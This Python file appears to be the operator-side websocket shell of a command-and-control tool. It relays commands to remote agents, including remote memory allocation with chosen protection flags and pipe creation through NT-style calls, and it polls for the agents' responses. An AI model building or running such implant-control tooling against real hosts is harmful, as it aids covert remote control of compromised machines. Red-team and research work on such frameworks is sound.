import logging
from models.response import Response
logger = logging.getLogger(__name__)
from services.exec_shell import rtlCreateProcessParametersEx, allocate_memory, createPipe

def _shell_ws_agent(ws, agent, identity):
    import shlex
    import threading
    import time

    from flask import current_app

    logger.info(f"Starting shell for agent {agent.id} and user {identity}.")

    app = current_app._get_current_object()
    stop_event = threading.Event()

    def normalize_to_bytes(data):
        if isinstance(data, bytes):
            return data
        if isinstance(data, bytearray):
            return bytes(data)
        return str(data).encode("utf-8")

    def rtl_test(*args):
        pass

    #
    # Command handlers
    #
    def cmd_echo(*args):
        

        return args

    def cmd_ping(*args):
        return "PING"

    def cmd_whoami(*args):
        return f"user={identity} agent={agent.id}"
    
    def cmd_alloc(*args):
        if len(args) != 2:
            return "[error] alloc requires two hex arguments (size, protection)"
        try:
            size = int(args[0], 16)
            protection = int(args[1], 16)
        except ValueError:
            raise ValueError(f"Invalid hex string")
        ntstatus, allocated_memory = allocate_memory(agent.id, size, protection)
        ntstatus = bytearray(ntstatus).hex()
        allocated_memory = bytearray(allocated_memory).hex()
        return f"NTSTATUS = {ntstatus}. Allocated memory in {allocated_memory}"

    def cmd_create_pipe(*args):
        ntstatus, pipe_handle = createPipe(agent.id)
        ntstatus = bytearray(ntstatus).hex()
        pipe_handle = bytearray(pipe_handle).hex()
        return f"NTSTATUS = {ntstatus}. Pipe Handle = {pipe_handle}"

    COMMANDS = {
        "echo": cmd_echo,
        "ping": cmd_ping,
        "whoami": cmd_whoami,
        "alloc": cmd_alloc,
        "rtltest": rtl_test,
        "createpipe": cmd_create_pipe,
    }

    def mark_response_received(response_id):
        db_session, res = Response.by_id_lock(response_id)

        res.received = True
        db_session.commit()
        db_session.remove()
        return True


    def dispatch_command(text):
        try:
            parts = shlex.split(text)
        except ValueError as e:
            return f"[error] parse error: {e}"

        if not parts:
            raise Exception

        command = parts[0]
        args = parts[1:]
        print(f"Arguments = {args}")

        handler = COMMANDS.get(command)
        if handler is None:
            return f"[error] unknown command: {command}"

        try:
            return handler(*args)
        except TypeError as e:
            return f"[error] invalid arguments for {command}: {e}"
        except Exception as e:
            logger.exception("Command handler failed for %s", command)
            return f"[error] command failed: {e}"

    def poll_incoming_responses():
        last_seen_id = 0

        with app.app_context():
            while not stop_event.is_set():
                try:
                    response_obj = Response.by_agent(agent.id)
                    print(response_obj)
                    if response_obj is not None:
                        if response_obj.received == False:
                            if response_obj.id != last_seen_id:
                                ws.send(response_obj.content.decode())
                                mark_response_received(response_obj.id)
                                continue
                    time.sleep(1)

                except Exception as e:
                    logger.exception("Polling failed for agent %s", agent.id)
                    try:
                        ws.send(f"[error] polling failed: {e}")
                    except Exception:
                        pass
                    stop_event.set()

    poll_thread = threading.Thread(target=poll_incoming_responses, daemon=True)
    poll_thread.start()

    try:
        ws.send(f"[shell] connected to shell {agent.id}")

        while not stop_event.is_set():
            try:
                message = ws.receive()
            except Exception:
                logger.info("Websocket receive failed or closed for shell %s", agent.id)
                break

            if message is None:
                logger.info("Websocket closed for shell %s", agent.id)
                break

            if isinstance(message, bytes):
                try:
                    message = message.decode("utf-8", errors="replace")
                except Exception:
                    message = str(message)

            text = str(message).strip()
            if not text:
                continue

            with app.app_context():

                # Parse command -> call function -> create request
                request_message = dispatch_command(text)
                if request_message is None:
                    continue
                ws.send(request_message)

    finally:
        stop_event.set()
        try:
            ws.close()
        except Exception:
            pass

        logger.info("Shell %s closed.", agent.id)